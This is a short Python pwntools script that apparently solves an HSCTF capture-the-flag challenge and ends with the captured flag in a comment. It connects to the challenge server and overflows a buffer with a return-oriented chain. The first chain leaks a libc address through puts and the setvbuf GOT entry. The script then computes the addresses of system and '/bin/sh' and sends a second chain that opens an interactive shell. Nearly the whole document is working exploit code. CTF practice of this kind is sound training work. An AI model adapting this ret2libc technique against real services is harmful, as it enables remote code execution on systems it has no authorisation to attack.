# -- coding: utf-8 --
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
# ENV
e = context.binary = ELF('./ex')
lib = e.libc
# r = e.process()
r=remote("ex.hsctf.com", 1337)

# VARIABLE
setvbuf_got = 0x404060
pop_rdi_ret= 0x00000000004014f3 
ret = 0x000000000040101a
main =0x0000000000401276
puts_plt =0x401100


payload = b"a"*40
payload+= flat(pop_rdi_ret, setvbuf_got, puts_plt, main)

pause()
r.sendline(payload)
time.sleep(0.2)
r.sendline(b"Q")
r.recvline()
setvbuf_libc = u64(r.recv(6).ljust(8,b"\x00"))
log.info("setvbuf_libc: %#x" %setvbuf_libc)

base_libc = setvbuf_libc - lib.sym.setvbuf
system_libc = base_libc + lib.sym.system
binsh_libc = base_libc + next(lib.search(b"/bin/sh"))
log.info("base_libc: %#x" %base_libc)


payload = b"a"*40
payload+= flat(ret, pop_rdi_ret, binsh_libc, system_libc, main)

pause()
r.sendline(payload)
time.sleep(0.2)
r.sendline(b"Q")

r.interactive()
# flag{I_wonder_if_there's_an_emacs_command_for_writing_pwn_exploits?}
